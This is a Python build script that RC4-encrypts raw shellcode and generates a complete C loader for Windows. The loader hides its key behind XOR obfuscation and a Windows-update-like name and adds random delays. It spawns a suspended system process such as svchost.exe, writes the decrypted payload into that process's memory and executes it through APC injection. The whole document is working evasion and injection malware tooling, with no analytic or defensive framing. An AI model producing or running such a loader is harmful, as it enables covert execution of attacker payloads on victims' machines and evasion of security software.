import sys
from Crypto.Cipher import ARC4

key = b"WindowsUpdateAgent2024"

if len(sys.argv) < 2:
    print("Usage: python encrypt_shellcode.py <shellcode.bin>")
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    shellcode = f.read()

cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)

# Build shellcode array string
shellcode_lines = []
for i in range(0, len(encrypted), 12):
    chunk = encrypted[i:i+12]
    line = "    " + ", ".join(f"0x{b:02X}" for b in chunk) + ","
    shellcode_lines.append(line)
shellcode_array = "\n".join(shellcode_lines)

loader_c = f"""#include <Windows.h>
#include <stdio.h>

#define TARGET_PROCESS        "svchost.exe"
#define DECRYPTION_KEY        "WindowsUpdateAgent2024"
#define KEY_LENGTH            22

#pragma warning (disable:4996)

typedef struct {{
    unsigned char S[256];
    int i, j;
}} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const unsigned char *key, int keylen) {{
    ctx->i = ctx->j = 0;
    for (int i = 0; i < 256; i++) ctx->S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + ctx->S[i] + key[i % keylen]) & 255;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }}
}}

unsigned char rc4_byte(RC4_CTX *ctx) {{
    ctx->i = (ctx->i + 1) & 255;
    ctx->j = (ctx->j + ctx->S[ctx->i]) & 255;
    unsigned char temp = ctx->S[ctx->i];
    ctx->S[ctx->i] = ctx->S[ctx->j];
    ctx->S[ctx->j] = temp;
    return ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 255];
}}

void rc4_decrypt(unsigned char *data, int datalen, const unsigned char *key, int keylen) {{
    RC4_CTX ctx;
    rc4_init(&ctx, key, keylen);
    for (int i = 0; i < datalen; i++) {{
        data[i] ^= rc4_byte(&ctx);
    }}
}}

unsigned char encrypted_shellcode[] = {{
{shellcode_array}
}};
unsigned int shellcode_size = {len(encrypted)};

void xor_decrypt(unsigned char *data, unsigned int size, const char *key) {{
    for (unsigned int i = 0; i < size; i++) {{
        data[i] ^= key[i % strlen(key)];
        data[i] = (data[i] >> 4) | (data[i] << 4);
        data[i] = ~data[i];
    }}
}}

void random_delay() {{
    SYSTEMTIME st;
    GetSystemTime(&st);
    DWORD seed = st.wMilliseconds;
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    DWORD delay = 1000 + (seed % 4000);
    Sleep(delay);
}}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {{
    SIZE_T    sNumberOfBytesWritten = NULL;
    DWORD    dwOldProtection = NULL;

    SIZE_T paddedSize = sSizeOfShellcode + (GetTickCount() % 1024);
    *ppAddress = VirtualAllocEx(hProcess, NULL, paddedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) return FALSE;

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {{
        VirtualFreeEx(hProcess, *ppAddress, 0, MEM_RELEASE);
        return FALSE;
    }}

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {{
        VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    }}

    return TRUE;
}}

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {{
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    STARTUPINFOA Si = {{ 0 }};
    PROCESS_INFORMATION Pi = {{ 0 }};

    Si.cb = sizeof(STARTUPINFOA);
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) return FALSE;

    sprintf(lpPath, "%s\\\\System32\\\\%s", WnDr, lpProcessName);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi)) {{
        return FALSE;
    }}

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    return (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL);
}}

const char* GetTargetProcess() {{
    const char* processes[] = {{
        "svchost.exe", "dllhost.exe", "rundll32.exe", "explorer.exe", "notepad.exe"
    }};
    DWORD tick = GetTickCount();
    int index = tick % (sizeof(processes) / sizeof(processes[0]));
    return processes[index];
}}

char* GetDecryptionKey() {{
    static char key[KEY_LENGTH + 1];
    const char obfuscated[] = {{
        'W'^0x55,'i'^0x55,'n'^0x55,'d'^0x55,'o'^0x55,'w'^0x55,'s'^0x55,
        'U'^0x55,'p'^0x55,'d'^0x55,'a'^0x55,'t'^0x55,'e'^0x55,'A'^0x55,
        'g'^0x55,'e'^0x55,'n'^0x55,'t'^0x55,'2'^0x55,'0'^0x55,'2'^0x55,
        '4'^0x55, 0
    }};
    for (int i = 0; i < KEY_LENGTH; i++) key[i] = obfuscated[i] ^ 0x55;
    key[KEY_LENGTH] = 0;
    return key;
}}

int main() {{
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    random_delay();

    const char* targetProcess = GetTargetProcess();

    if (!CreateSuspendedProcess(targetProcess, &dwProcessId, &hProcess, &hThread)) {{
        targetProcess = "notepad.exe";
        if (!CreateSuspendedProcess(targetProcess, &dwProcessId, &hProcess, &hThread)) {{
            return 1;
        }}
    }}

    PBYTE shellcode_copy = (PBYTE)LocalAlloc(LPTR, shellcode_size);
    if (!shellcode_copy) {{
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }}

    memcpy(shellcode_copy, encrypted_shellcode, shellcode_size);

    const char* key = GetDecryptionKey();
    rc4_decrypt(shellcode_copy, shellcode_size, (unsigned char*)key, strlen(key));

    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode_copy, shellcode_size, &pAddress)) {{
        LocalFree(shellcode_copy);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }}

    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);
    ResumeThread(hThread);
    Sleep(500);

    LocalFree(shellcode_copy);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}}
"""

output_file = "loader.c"
with open(output_file, "w") as f:
    f.write(loader_c)

print(f"[+] Generated {output_file} with {len(encrypted)} bytes of encrypted shellcode")
